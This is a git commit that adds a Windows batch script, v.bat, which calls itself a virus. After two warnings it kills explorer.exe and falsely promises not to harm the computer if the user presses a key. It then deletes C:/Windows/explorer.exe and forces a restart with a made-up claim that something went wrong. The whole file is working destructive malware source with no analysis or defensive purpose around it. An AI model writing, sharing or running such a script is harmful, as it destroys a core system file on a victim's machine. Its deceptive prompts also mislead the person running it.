88e7e8bc92949d7ab47cd82d6f5ed36ffd541ab3
Michal <148103602+Kelko249@users.noreply.github.com>
2024-07-06 08:38:13 +0200

    Create of v.bat

---
+++ v.bat
@@ -0,0 +1,21 @@
+title Run
+echo This program that you are running is a virus. A computer virus is a type of malware that, when executed, replicates itself by modifying other computer programs and inserting its own code into those programs. If this replication succeeds, the affected areas are then said to be "infected" with a computer virus, a metaphor derived from biological viruses. If you are running this in a safe inveroment, and you know what you are doing, press space. Else exit this window.
+pause
+echo This is the last warning.
+pause
+cls
+color a
+title get rekt
+@echo off
+taskkill /f /im explorer.exe
+echo If you help me, i will not render your computer useless. You can help me by pressing "Y"
+pause
+del C:/Windows/explorer.exe
+echo Thanks for helping me. 
+title Thanks
+pause 
+echo Here you go
+pause
+taskman.exe
+echo Oh, no. Some thing has gone wrong. I need to restart your computer to fix this issue.
+shutdown /r
